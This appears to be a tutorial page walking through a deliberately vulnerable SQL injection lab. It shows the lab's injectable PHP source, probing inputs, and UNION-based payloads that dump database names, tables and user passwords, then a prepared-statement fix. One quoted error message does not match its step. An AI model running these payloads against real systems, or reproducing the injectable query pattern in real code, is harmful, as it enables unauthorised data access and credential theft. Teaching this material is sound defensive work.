---
type: page
title: "SQL Injection Lab – Lesson 1 (Error-Based: String)"

draft: false
tags: ["SQL Injection", "Web Security", "Error-Based Injection", "Labs"]
categories: ["Learning", "Web Security", "SQLi"]
description: "A walkthrough of SQL Injection Lab Lesson 1: Error-Based String Injection. Explanation, vulnerable code, exploitation steps, payloads, and secure coding practices."
# Add these lines to hide from lists:
_build:
  list: never
  render: true
---
type: page


## What is this Lesson About?  
This lab demonstrates a classic **Error-Based SQL Injection vulnerability**.  

The application takes user input from the URL (`id` parameter) and uses it directly in a SQL query without proper validation or sanitization.

The purpose of this lesson is to understand how SQL errors can reveal valuable information and how attackers exploit them.


## How to Identify if It Is Error-Based?  
When testing a parameter for SQL injection, attackers often add characters like:  

```
?id=1
?id=1'
?id=1"
?id=1)
?id=1')
?id=1")
```

If the application displays a **database error message** 

> Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use **near ''1'' LIMIT 0,1'** at line 1

This indicates an **Error-Based SQL Injection**.  

In this lab, when an invalid character such as `'` (single quote) is added, the application responds with an SQL error.  

This confirms that the application is vulnerable to **Error-Based SQL Injection (String)**.



## Vulnerable Source Code 

```php
<?php
// https://github.com/Audi-1/sqli-labs/blob/master/Less-1/index.php
// including the MySQLi connection file
include("../sql-connections/sql-connect.php");

// check for ID parameter
if (isset($_GET['id'])) {
    $id = $_GET['id'];

    // SQL query
    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result = mysqli_query($con, $sql);

    if ($result) {
        $row = mysqli_fetch_array($result);
        if ($row) {
            echo "Your Login name: " . htmlspecialchars($row['username']) . "<br>";
            echo "Your Password: " . htmlspecialchars($row['password']);
        } else {
            echo "No user found with that ID.";
        }
    } else {
        echo "Query Error: " . mysqli_error($con);
    }
} else {
    echo "Please input the ID as parameter with numeric value";
}
?>
```
Issue:
- The variable `$id` is directly placed into the query.
- No validation, escaping, or parameterization is done.


### How the Injection Happens
The injection happens because the application directly takes the `id` parameter from the URL.


```bash
http://localhost/sqli-labs/Less-1/?id=1
```
The input is inserted into the query without sanitization

```sql
SELECT * FROM users WHERE id='1' LIMIT 0,1
```


If an attacker inputs `' OR '1'='1` the query becomes

```sql
SELECT * FROM users WHERE id='' OR '1'='1' LIMIT 0,1
```
Since `'1'='1'` is always true, the attacker can bypass conditions and retrieve unintended results.

### Payloads for Exploitation
Once the injection point is confirmed, attackers can use payloads to extract sensitive data from the database.

Checking Injection
```sql
?id=1' OR '1'='1 --+
?id=1' AND '1'='2 --+
```

## Dumping data from DB

Finding Column Count (using ORDER BY)
```sql
?id=1' ORDER BY 1 --+
?id=1' ORDER BY 2 --+
?id=1' ORDER BY 3 --+
```

If we run
```sql
?id=1' ORDER BY 4 --+
```
We will receive this error which mean we only have 3 columns
> Fatal error: Uncaught mysqli_sql_exception: Unknown column '19' in 'order clause' 

Now we've 3 columns, so our payloads will look like this
```sql
?id=-1' UNION SELECT 1,2,3 --+
```

![Alt text](/sqli-01/columnreflect.jpg)

As you can see here our column is beign reflected


Getting Database Name
```sql
?id=-1' UNION SELECT 1,database(),3 --+
```
![Alt text](/sqli-01/databasereflect.jpg)
Getting Current User
```sql
?id=-1' UNION SELECT 1, user(),3 --+
```
![Alt text](/sqli-01/cuser.jpg)
Listing Databases
```sql
?id=-1' UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --+
```
![Alt text](/sqli-01/listofdb.jpg)
Dumping Tables of Current Database
```sql
?id=-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() --+
```
![Alt text](/sqli-01/tofcdb.jpg)
Dumping Columns of a Table
```sql
?id=-1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --+
```
![Alt text](/sqli-01/dcofct.jpg)
Extracting Data from Users Table
```sql
?id=-1' UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password)FROM users --+
```
![Alt text](/sqli-01/edfut.jpg)


## How to Fix SQL Injection
To prevent SQL Injection, follow secure coding practices:

Use Prepared Statements (Parameterized Queries):

```php
<?php
include("../sql-connections/sql-connect.php");

if (isset($_GET['id'])) {
    $id = $_GET['id'];

    // Use prepared statements
    $stmt = $con->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
    $stmt->bind_param("i", $id); // "i" means integer
    $stmt->execute();

    $result = $stmt->get_result();
    if ($row = $result->fetch_assoc()) {
        echo "Your Login name: " . htmlspecialchars($row['username']) . "<br>";
        echo "Your Password: " . htmlspecialchars($row['password']);
    } else {
        echo "No user found with that ID.";
    }
}
?>
```
Other Best Practices:

- Validate input (ensure id is numeric).
- Hide detailed database error messages from users.
- Use least privilege principle for database accounts.

## Final Summary
This lesson demonstrates an Error-Based String SQL Injection.

- Attackers identify it by injecting special characters and observing database error messages.
- The vulnerability occurs due to unsanitized input directly used in SQL queries.
- Payloads can extract database name, user, tables, columns, and data.
- The solution is to use prepared statements, input validation, and avoid displaying detailed error messages.
